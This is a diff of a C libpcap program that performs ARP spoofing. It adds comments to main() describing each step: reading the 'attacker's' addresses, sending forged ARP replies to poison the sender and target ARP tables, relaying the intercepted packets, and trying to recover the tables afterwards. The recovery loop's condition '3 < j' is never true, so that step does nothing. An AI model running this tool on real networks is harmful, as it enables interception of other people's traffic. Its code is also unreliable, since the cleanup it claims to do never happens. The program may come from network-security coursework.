@@ -116,6 +116,7 @@ int sendArpReply(pcap_t* handle, Mac sourceMac, Ip sourceIp, Mac macMap,
 }
 
 int main(int argc, char* argv[]) {
+  //assuagement verification
   if (5 > argc || 0 != (argc - 1) % 2) {
     usage();
     return -1;
@@ -123,19 +124,24 @@ int main(int argc, char* argv[]) {
 
   char* dev = argv[1];
   char errbuf[PCAP_ERRBUF_SIZE];
+
+  //open network device
   pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
   if (handle == nullptr) {
     printf("FATAL: Couldn't open device %s(%s)\n", dev, errbuf);
     return -1;
   }
 
+  //get attacker's mac address
   Mac myMac = getMyMacAddress(dev);
+  //get attacker's ip address
   Ip myIp = getMyIpv4Address(dev);
 
   map<Ip, Mac> macMap;
   Ip senderIp[(argc - 3) / 2];
   Ip targetIp[(argc - 3) / 2];
 
+  //get sender and target's ip addresses
   for (int i = 0; (argc - 3) / 2 > i; i++) {
     senderIp[i] = Ip(argv[2 + i * 2]);
     targetIp[i] = Ip(argv[3 + i * 2]);
@@ -149,6 +155,7 @@ int main(int argc, char* argv[]) {
 
   bool escapeFlag;
 
+  //get sender and target's mac address
   for (int i = 0; (argc - 3) / 2 > i; i++) {
     if (macMap.end() == macMap.find(senderIp[i])) {
       escapeFlag = false;
@@ -268,6 +275,7 @@ int main(int argc, char* argv[]) {
     }
   }
 
+  //send arp packet to falsificate arp table
   for (int i = 0; (argc - 3) / 2 > i; i++) {
     if (macMap.end() != macMap.find(senderIp[i])) {
       res = sendArpReply(handle, myMac, targetIp[i],
@@ -289,8 +297,8 @@ int main(int argc, char* argv[]) {
     }
   }
 
+  //maintain falsificated arp table and relay packets
   startTime = time(NULL);
-
   while (time(NULL) - startTime < durationTime) {
     struct pcap_pkthdr* header;
     const uint8_t* packet;
@@ -341,6 +349,7 @@ int main(int argc, char* argv[]) {
     }
   }
 
+  //recover arp table
   for (int i = 0; (argc - 3) / 2 > i; i++) {
     if (macMap.end() != macMap.find(senderIp[i])) {
       for (int j = 0; 3 < j; j++) {
@@ -363,5 +372,6 @@ int main(int argc, char* argv[]) {
     }
   }
 
+  //close network device
   pcap_close(handle);
 }
